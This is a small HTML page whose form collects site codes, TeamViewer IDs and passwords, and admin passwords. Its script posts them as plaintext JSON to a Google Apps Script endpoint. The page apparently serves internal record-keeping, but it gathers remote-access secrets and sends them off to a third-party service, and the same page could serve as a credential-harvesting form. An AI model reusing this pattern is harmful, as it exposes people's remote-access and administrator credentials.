<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Data Collection</title>
    <script>
        async function submitForm(event) {
            event.preventDefault(); // Prevent the default form submission

            // Collect form data
            const roCode = document.getElementById('roCode').value;
            const roName = document.getElementById('roName').value;
            const teamViewerID = document.getElementById('teamViewerID').value;
            const teamViewerPassword = document.getElementById('teamViewerPassword').value;
            const adminPassword = document.getElementById('adminPassword').value;

            // Send data to Google Apps Script
            const response = await fetch('https://script.google.com/macros/s/AKfycbyDdRnN1WmYzmKDlxy3uA85y_oaxWcSzJmvOqnhXEZuuvrLRgjikeI4WW8J0naQ6y4/exec', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ roCode, roName, teamViewerID, teamViewerPassword, adminPassword })
            });

            // Handle the response
            if (response.ok) {
                alert('Data saved successfully!');
                document.getElementById('dataForm').reset(); // Reset the form
            } else {
                const errorMsg = await response.text();
                alert('Error saving data: ' + errorMsg);
            }
        }
    </script>
</head>
<body>
    <h1>User Information Form</h1>
    <form id="dataForm" onsubmit="submitForm(event)">
        <label for="roCode">Ro Code:</label><br>
        <input type="text" id="roCode" name="roCode" required><br><br>

        <label for="roName">Ro Name:</label><br>
        <input type="text" id="roName" name="roName" required><br><br>

        <label for="teamViewerID">TeamViewer ID:</label><br>
        <input type="text" id="teamViewerID" name="teamViewerID" required><br><br>

        <label for="teamViewerPassword">TeamViewer Password:</label><br>
        <input type="password" id="teamViewerPassword" name="teamViewerPassword" required><br><br>

        <label for="adminPassword">Admin Password:</label><br>
        <input type="password" id="adminPassword" name="adminPassword" required><br><br>

        <input type="submit" value="Submit">
    </form>
</body>
</html>
